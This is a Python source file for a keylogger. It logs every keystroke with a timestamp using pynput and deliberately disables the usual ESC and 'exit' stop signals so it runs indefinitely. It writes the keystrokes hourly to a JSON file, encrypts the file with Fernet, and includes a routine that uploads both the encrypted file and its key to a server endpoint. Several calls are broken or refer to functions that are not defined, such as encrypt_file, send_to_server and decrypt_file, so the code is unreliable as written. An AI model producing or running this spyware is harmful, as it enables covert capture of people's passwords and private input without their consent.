import time
import os
import json
from pynput import keyboard
from cryptography.fernet import Fernet
from requests import request

# ============================================================
# Service (State)
# ------------------------------------------------------------
# Holds the runtime state:
#   - global_log: list of "blocks" (each block is a dict: minute -> list of keys)
#   - log_l:      current block being accumulated (minute -> list of keys)
#   - long_str:   rolling tail of printable chars (used for simple sequence checks)
# ============================================================

class KeyLoggerService:
    def __init__(self):
        self.global_log = []   # List[Dict[str, List[Any]]]
        self.log_l = {}        # Dict[str, List[Any]]
        self.long_str = ""     # Accumulates chars (used for naive "exit" detection)

    @staticmethod
    def get_time_minute() -> str:
        """Return current local time in minute resolution: 'YYYY-MM-DD HH:MM'."""
        return time.strftime("%Y-%m-%d %H:%M", time.localtime())

    def make_long_str(self, key) -> None:
        """
        If the key is a printable char (has .char), append it to long_str.
        We DO NOT stop the program on 'exit' – the app runs indefinitely.
        """
        if hasattr(key, 'char') and key.char:
            self.long_str += key.char

    def make_dict(self, key) -> None:
        """
        Append the raw key event under the current minute in the current block.
        We store the original pynput key object (or its str) and serialize later.
        """
        now = self.get_time_minute()
        if now in self.log_l:
            self.log_l[now].append(key)
        else:
            self.log_l[now] = [key]


# ============================================================
# File Writer (Sink) – JSON (single top-level array)
# ------------------------------------------------------------
# Writes valid JSON (an array) to 'keyfile.json'.
# Every flush:
#   1) Convert runtime blocks -> list of records
#   2) Load existing array (if file exists), append records
#   3) Write back as a single JSON array (pretty printed)
#
# This guarantees the file is always valid JSON (no JSON Lines).
# Device grouping is kept via "device_id" on each record.
# ============================================================

class FileWriter:
    def __init__(self, device_id: str, path: str = "keyfile.json"):
        self.device_id = device_id
        self.path = path

    @staticmethod
    def _serialize_token(t) -> str:
        """
        Convert a pynput key event to a string:
          - printable keys -> the actual character
          - special keys   -> their str representation, e.g. 'Key.esc'
        """
        if hasattr(t, "char") and t.char:
            return t.char
        return str(t)

    def _load_array(self) -> list:
        """
        Load an existing JSON array from disk (if present). If the file is missing,
        empty, or invalid, return an empty list. This keeps the file always valid.
        """
        if not os.path.exists(self.path) or os.path.getsize(self.path) == 0:
            return []
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
        except Exception:
            return []

    def _dump_array(self, data: list) -> None:
        """Write the full array back to disk as valid JSON."""
        with open(self.path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

    def outing_to_file(self, character_blocks: list[dict]) -> None:
        """
        Accepts a list of blocks (each block is {minute: [keys...]}) and appends
        them to the JSON file as records, keeping a single top-level JSON array.
        """
        # Build new records from the provided blocks
        new_records = []
        for block in character_blocks:               # block: Dict[str, List[Any]]
            for minute, items in block.items():      # minute: str, items: List[Any]
                record = {
                    "device_id": self.device_id,
                    "time": minute,
                    "keys": [self._serialize_token(t) for t in items],
                }
                new_records.append(record)

        # Load -> extend -> write back as a SINGLE JSON ARRAY
        data = self._load_array()
        data.extend(new_records)
        self._dump_array(data)


# ============================================================
# Manager (Flow / Orchestration)
# ------------------------------------------------------------
# Responsibilities:
#   - Handle each key event
#   - Maintain hourly flush: at the top of a new hour, write accumulated logs to file
#   - Do NOT stop on ESC or on the word 'exit' – program runs indefinitely
#   - Optional: on SPACE, close the current block (kept for compatibility)
# ============================================================

class KeyLoggerManager:
    def __init__(self, service: KeyLoggerService, writer: FileWriter):
        # (kept placeholders to match your original structure)
        self.log_l = None
        self.Key = None
        self.global_log = None
        self.long_str = None

        self.service = service
        self.writer = writer

        # Track the current hour (e.g., 'YYYY-MM-DD HH'); used for hourly flush
        self.current_hour = time.strftime("%Y-%m-%d %H", time.localtime())

    def _hour_string(self) -> str:
        """Return current local time truncated to hour: 'YYYY-MM-DD HH'."""
        return time.strftime("%Y-%m-%d %H", time.localtime())

    def _flush_all(self) -> None:
        """
        Flush all accumulated data to disk as valid JSON array:
          - Include the current block (if not empty)
          - Write via FileWriter
          - Clear runtime blocks
        """
        if self.service.log_l:
            self.service.global_log.append(self.service.log_l)
        if self.service.global_log:
            self.writer.outing_to_file(self.service.global_log)
            self.service.global_log = []
        self.service.log_l = {}

    def key_for_log(self, key):
        """
        Called on every key release:
          1) Update tail (for sequences) and the current block
          2) If the hour changed -> flush accumulated logs to JSON
          3) Keep SPACE behavior: close current block (compatibility)
          4) Ignore 'exit' and ESC as stop signals – the program keeps running
        """
        # (1) Update state
        self.service.make_long_str(key)
        self.service.make_dict(key)

        # (2) Hourly flush at the top of a new hour
        new_hour = self._hour_string()
        if new_hour != self.current_hour:
            self._flush_all()
            self.current_hour = new_hour

        # (3) Keep SPACE behavior: close current block (no file write here)
        if key == keyboard.Key.space:
            if self.service.log_l:
                self.service.global_log.append(self.service.log_l)
                self.service.log_l = {}

        # (4) Ignore 'exit' and ESC as termination signals (no return False)
        #     We can still print when ESC is pressed, but we DO NOT stop.
        if self.service.long_str[-4:] == "exit":
            # Reset the detector tail; do NOT stop the program
            self.service.long_str = ""

        if key == keyboard.Key.esc:
            # Optional: console print for visibility (kept from your previous version)
            if self.service.log_l:
                self.service.global_log.append(self.service.log_l)
                self.service.log_l = {}
            for block in self.service.global_log:
                for minute in block:
                    print(f"{minute}\n{block[minute]} ")
            # Do NOT stop; do NOT force write here (hourly flush handles persistence)

        return None

    def starting_listening(self):
        """
        Start the keyboard listener. It will run indefinitely unless the process
        is stopped manually (Ctrl+C, killing the process, etc.). Neither 'exit'
        sequence nor ESC will terminate it.
        """
        self.service.log_l = {}
        self.service.long_str = ""
        with keyboard.Listener(on_release=self.key_for_log) as listener:
            listener.join()


# ============================================================
# Encryptor
# ------------------------------------------------------------
# Provides key management (Fernet) and file encrypt/decrypt helpers.
# Left as-is; note that if the listener runs forever, code placed after
# starting_listening() in __main__ will not execute (by design).
# ============================================================

class Encryptor:
    def __init__(self, key_path: str):
        self.key_path = key_path
        self.key: bytes | None = None

    def make_key(self) -> bytes:
        """Load existing key from disk or create a new one, store, and return it."""
        if os.path.exists(self.key_path):
            with open(self.key_path, "rb") as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(self.key_path, "wb") as f:
                f.write(self.key)
        print("Key:", self.key.decode())
        return self.key

    def encrypt_file(self, input_filename: str, output_filename: str, key: bytes) -> None:
        """Encrypt input file and write ciphertext to output file."""
        f = Fernet(key)
        with open(input_filename, "rb") as fin:
            data = fin.read()
        enc = f.encrypt(data)
        with open(output_filename, "wb") as fout:
            fout.write(enc)

class NetworkWriter:
    def send_to_server(file_data, key, server_url):
        files = {
            "file": ("encrypted_file.bin", file_data),
            "key": ("key.key", key)
        }
        response = request.post(server_url, files=files)
        return response


# ============================================================
# Main
# ------------------------------------------------------------
# Notes:
#   - The listener runs indefinitely (no ESC/exit stop).
#   - Hourly flush writes valid JSON array to 'keyfile.json'.
#   - The encryption demo below will NOT run unless you manually stop the process.
# ============================================================

if __name__ == "__main__":
    service = KeyLoggerService()
    writer = FileWriter(device_id=os.getenv("DEVICE_ID", "UNKNOWN-DEVICE"), path="keyfile.json")
    manager = KeyLoggerManager(service, writer)
    manager.starting_listening()
    encrypted_data, key = encrypt_file("secret.txt")
    resp = send_to_server(encrypted_data, key, "http://127.0.0.1:5000/upload")
    print("Server response:", resp.text)

    # The following code will not execute while the listener runs forever.
    # Keep it here if you plan to stop the process externally and then run encryption.
    original  = "keyfile.json"
    encrypted = "keyfile.encrypted"
    decrypted = "keyfile_decrypted.json"

    enc = Encryptor("key.key")
    key = enc.make_key()
    enc.encrypt_file(original, encrypted, key)
    enc.decrypt_file(encrypted, decrypted, key)
    print("Encryption & Decryption done.")